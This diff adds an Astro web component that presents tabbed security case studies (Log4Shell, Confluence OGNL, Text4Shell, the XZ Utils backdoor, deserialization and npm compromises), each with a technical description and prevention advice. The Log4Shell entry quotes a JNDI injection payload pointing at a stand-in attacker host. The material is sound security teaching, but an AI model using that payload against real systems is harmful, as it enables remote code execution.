@@ -1,0 +1,201 @@
+---
+import ContentTabs from './ContentTabs.astro';
+import type { Tab } from './ContentTabs.astro';
+
+interface CaseStudy {
+  id: string;
+  label: string;
+  title: string;
+  year: string;
+  cve: string;
+  description: string;
+  technicalDetail: string;
+  guidelineViolated: string;
+  prevention: string;
+}
+
+const cases: CaseStudy[] = [
+  {
+    id: 'log4shell',
+    label: 'Log4Shell',
+    title: 'Log4Shell — CVE-2021-44228',
+    year: '2021',
+    cve: 'CVE-2021-44228',
+    description: 'Remote Code Execution in Apache Log4j 2.x via JNDI lookup injection in log messages.',
+    technicalDetail: 'Apache Log4j 2.x supported JNDI lookups in log message format strings. An attacker could inject <code>${jndi:ldap://attacker.com/exploit}</code> into any logged input — HTTP headers, form fields, user agents. Log4j would resolve this via JNDI, connecting to the attacker\'s LDAP server, which could return a serialized Java object achieving remote code execution.',
+    guidelineViolated: 'Injection/Inclusion — user input was interpreted as a format expression. A logging library had no business resolving JNDI lookups from logged data.',
+    prevention: 'Never interpret user-supplied data as executable expressions. Logging frameworks should treat all input as plain text.',
+  },
+  {
+    id: 'confluence-ognl',
+    label: 'Confluence OGNL',
+    title: 'Confluence OGNL Injection — CVE-2021-26084',
+    year: '2021',
+    cve: 'CVE-2021-26084',
+    description: 'Unauthenticated OGNL expression injection in Atlassian Confluence Server.',
+    technicalDetail: 'Atlassian Confluence Server allowed unauthenticated OGNL expression injection. OGNL is a Java expression language, and crafted HTTP requests to certain endpoints could inject arbitrary expressions that executed Java code on the server.',
+    guidelineViolated: 'Injection/Inclusion — untrusted input was passed directly to an expression language evaluator without sanitization or sandboxing.',
+    prevention: 'Never pass untrusted input to expression language evaluators. Sandbox expression evaluation and use allowlists for permitted expressions.',
+  },
+  {
+    id: 'cobalt-strike',
+    label: 'Cobalt Strike XSS',
+    title: 'Cobalt Strike XSS',
+    year: '2022',
+    cve: '',
+    description: 'XSS vulnerability in a red team simulation tool\'s Swing-based client.',
+    technicalDetail: 'Cobalt Strike, a red team simulation tool, had an XSS vulnerability in its client. The client uses Swing, which renders HTML — so attacker-controlled HTML could be injected and rendered in the UI.',
+    guidelineViolated: 'Input Validation — untrusted data rendered as HTML in a Swing component without escaping.',
+    prevention: 'Escape or sanitize all untrusted data before rendering in any UI component, including desktop clients.',
+  },
+  {
+    id: 'text4shell',
+    label: 'Text4Shell',
+    title: 'Text4Shell — CVE-2022-42889',
+    year: '2022',
+    cve: 'CVE-2022-42889',
+    description: 'Code execution via Apache Commons Text string interpolation on untrusted input.',
+    technicalDetail: 'Apache Commons Text\'s <code>StringSubstitutor</code> supported interpolation prefixes like <code>${script:...}</code>, <code>${dns:...}</code>, and <code>${url:...}</code>. If user-controlled input was passed through <code>StringSubstitutor.replace()</code>, attackers could trigger script execution or DNS lookups. Same class of flaw as Log4Shell — treating data as code through string interpolation.',
+    guidelineViolated: 'Injection/Inclusion — string interpolation on untrusted input.',
+    prevention: 'Never perform string interpolation or substitution on untrusted input. Disable dangerous interpolators.',
+  },
+  {
+    id: 'xz-utils',
+    label: 'XZ Utils Backdoor',
+    title: 'XZ Utils Backdoor — CVE-2024-3094',
+    year: '2024',
+    cve: 'CVE-2024-3094',
+    description: 'Supply chain attack via a malicious maintainer inserting a backdoor into the build process.',
+    technicalDetail: 'A malicious maintainer spent ~2 years gaining trust as an xz-utils contributor, then inserted a backdoor into the build process. Obfuscated binary test files were committed, and a modified <code>configure</code> script extracted malicious code into <code>liblzma</code>. This code hooked into <code>sshd</code> (via systemd\'s dependency on lzma), intercepting RSA key verification to allow unauthorized remote access. Discovered by Andres Freund who noticed SSH latency anomalies.',
+    guidelineViolated: 'Supply Chain Security — insufficient review of build scripts, binary test fixtures, and single-maintainer trust.',
+    prevention: 'Code review of build scripts and binary artifacts, reproducible builds, limiting trust in single maintainers, verifying test files are not executable payloads.',
+  },
+  {
+    id: 'deserialization-2025',
+    label: 'Deserialization (2025)',
+    title: 'Deserialization Vulnerabilities — 2025',
+    year: '2025',
+    cve: 'CVE-2025-31324 and others',
+    description: 'Multiple products hit by Java deserialization RCE — SAP NetWeaver (CVSS 10.0), Cisco, NetIQ, SolarWinds.',
+    technicalDetail: 'SAP NetWeaver (CVE-2025-31324), Cisco Unified Contact Center, NetIQ, SolarWinds — all hit by deserialization vulnerabilities in 2025. The SAP case was particularly severe (CVSS 10.0): an unauthenticated endpoint accepted serialized Java objects without filtering, leading to remote code execution.',
+    guidelineViolated: 'Serialization/Deserialization — no <code>ObjectInputFilter</code>, no authentication on endpoints accepting serialized data.',
+    prevention: 'Use ObjectInputFilter to restrict deserializable classes. Require authentication on all endpoints. Avoid Java native serialization entirely — prefer JSON or Protocol Buffers.',
+  },
+  {
+    id: 'npm-2025',
+    label: 'npm Compromise',
+    title: 'npm Packages Compromise — 2025',
+    year: '2025',
+    cve: '',
+    description: 'Phishing attacks targeting npm package maintainers, leading to compromised packages.',
+    technicalDetail: 'Phishing attacks targeting npm package maintainers led to compromised packages in the ecosystem. Attackers gained access to maintainer accounts and published malicious versions of popular packages.',
+    guidelineViolated: 'Dependency Management — insufficient verification of package integrity and maintainer authentication.',
+    prevention: 'Verify package integrity with lockfiles and checksums. Audit dependencies regularly. Use 2FA for package publishing. Pin dependency versions.',
+  },
+];
+
+const tabs: Tab[] = cases.map((c) => ({ id: c.id, label: c.label }));
+---
+
+<ContentTabs tabs={tabs}>
+  {cases.map((caseStudy) => (
+    <div data-panel={caseStudy.id}>
+      <p class="panel-year">{caseStudy.year}</p>
+      <h4 class="panel-title">{caseStudy.title}</h4>
+      <p class="panel-description">{caseStudy.description}</p>
+
+      <h4 class="panel-heading">What happened:</h4>
+      <p class="panel-text" set:html={caseStudy.technicalDetail} />
+
+      <h4 class="panel-heading">Guideline violated:</h4>
+      <p class="panel-text panel-violated" set:html={caseStudy.guidelineViolated} />
+
+      <h4 class="panel-heading">How to prevent:</h4>
+      <p class="panel-text">{caseStudy.prevention}</p>
+    </div>
+  ))}
+</ContentTabs>
+
+<style>
+  .panel-year {
+    display: inline-block;
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: #ffffff;
+    background-color: #dc2626;
+    padding: 0.125rem 0.5rem;
+    border-radius: 0.25rem;
+    margin-bottom: 0.5rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .panel-title {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #000000;
+    margin-bottom: 0.5rem;
+  }
+
+  :global(.dark) .panel-title {
+    color: #ffffff;
+  }
+
+  .panel-description {
+    font-size: 1rem;
+    line-height: 1.75;
+    color: #4b5563;
+    margin-bottom: 1.5rem;
+    font-style: italic;
+  }
+
+  :global(.dark) .panel-description {
+    color: #9ca3af;
+  }
+
+  .panel-heading {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #000000;
+    margin-top: 1.25rem;
+    margin-bottom: 0.5rem;
+  }
+
+  :global(.dark) .panel-heading {
+    color: #ffffff;
+  }
+
+  .panel-text {
+    color: #000000;
+    line-height: 1.75;
+    margin-bottom: 1rem;
+  }
+
+  :global(.dark) .panel-text {
+    color: #d1d5db;
+  }
+
+  .panel-violated {
+    border-left: 3px solid #dc2626;
+    padding-left: 1rem;
+    background-color: #fef2f2;
+    padding: 0.75rem 1rem;
+    border-radius: 0 0.375rem 0.375rem 0;
+  }
+
+  :global(.dark) .panel-violated {
+    background-color: #451a1a;
+    border-left-color: #f87171;
+  }
+
+  .panel-text :global(code) {
+    background-color: #f3f4f6;
+    padding: 0.125rem 0.375rem;
+    border-radius: 0.25rem;
+    font-size: 0.875em;
+  }
+
+  :global(.dark) .panel-text :global(code) {
+    background-color: #374151;
+  }
+</style>
